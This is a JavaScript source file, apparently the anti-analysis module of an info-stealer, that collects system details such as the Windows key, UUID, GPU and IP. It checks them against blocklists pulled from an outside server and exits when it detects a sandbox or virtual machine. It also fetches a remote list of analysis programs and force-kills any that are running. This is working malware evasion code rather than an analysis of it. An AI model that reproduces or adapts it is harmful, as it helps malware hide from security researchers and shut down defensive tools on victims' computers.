const { systemInfo } = require("../../utils/systeminfo.js");

const child_process  = require("child_process");
const process        = require("process");
const axios          = require("axios");
const util           = require("util");

const exec = util.promisify(child_process.exec);

const request = async (url) => {
    try {
        const response = await axios.get(url);
        return response.data;
    } catch (error) {
        console.error(`Error fetching data from ${url}:`, error);
        return {};
    }
};

const killBlacklistedProcesses = async (url, command) => {
    try {
        const { stdout } = await exec(command);
        const processList = stdout.split(/\r?\n/);
        const blacklistedProgs = (await request(url)).blacklistedprog;

        for (const line of processList) {
            const name = line.split(/\s+/)[0].replace(".exe", "");
            if (blacklistedProgs.includes(name)) {
                try {
                    await exec(`taskkill /F /IM ${name}.exe`);
                } catch (err) {
                    console.error(`Error killing process ${name}.exe:`, err);
                }
            }
        }
    } catch (error) {
        console.error(`Error executing command ${command}:`, error);
    }
};

const isBlocked = async (url, value) => {
    try {
        const data = await request(url);
        return data.includes(value);
    } catch (error) {
        console.error(`Error checking if ${value} is blocked:`, error);
        return false;
    }
};

const checkBlacklist = async (category, value) => {
    return await isBlocked(
        `https://6889-fun.vercel.app/api/aurathemes/bypass/blocked/${category}?aurathemes=true`,
        value
    );
};

const computerNameBlocked = (value) => checkBlacklist("pcnames", value);
const userNameBlocked = (value) => checkBlacklist("progr", value);
const uuidBlocked = (value) => checkBlacklist("uuids", value);
const gpuBlocked = (value) => checkBlacklist("gpus", value);
const ipBlocked = (value) => checkBlacklist("ips", value);
const osBlocked = (value) => checkBlacklist("oss", value);

module.exports = async () => {
    try {
        const { 
            WINDOWS_VERSION,
            WINDOWS_KEY,
            SCREENSHOTS,
            DISKS_INFO,
            CPU_COUNT,
            NETWORK,
            UUID,
            DISK,
            CPU,
            GPU,
            RAM,
            IP,
            OS,
        } = await systemInfo();
        
        const [
            COMPUTER_NAME,
            USER_NAME
        ] = [
            process.env.COMPUTERNAME || "Not found",
            process.env.USERNAME || "Not found"
        ];

        const [
            isComputerNameBlocked,
            isUsernameBlocked,
            isUuidBlocked,
            isGpuBlocked,
            isOsBlocked,
            isIpBlocked,
        ] = await Promise.all([
            computerNameBlocked(COMPUTER_NAME),
            userNameBlocked(USER_NAME),
            uuidBlocked(UUID),
            gpuBlocked(GPU),
            osBlocked(OS),
            ipBlocked(IP)
        ]);

        if (
            (!isNaN(CPU_COUNT) && CPU_COUNT < 2)
            || (!isNaN(DISK) && DISK < 80)
            || (!isNaN(RAM) && RAM < 2)
            || isComputerNameBlocked
            || isUsernameBlocked
            || isUuidBlocked
            || isGpuBlocked
            || isOsBlocked
            || isIpBlocked
        ) return process.abort();

        await killBlacklistedProcesses(
            "https://6889-fun.vercel.app/api/aurathemes/bypass/blacklist/progr?aurathemes=true",
            "tasklist"
        );

    } catch (error) {
        console.error("Error in antidebug function:", error);
    }
};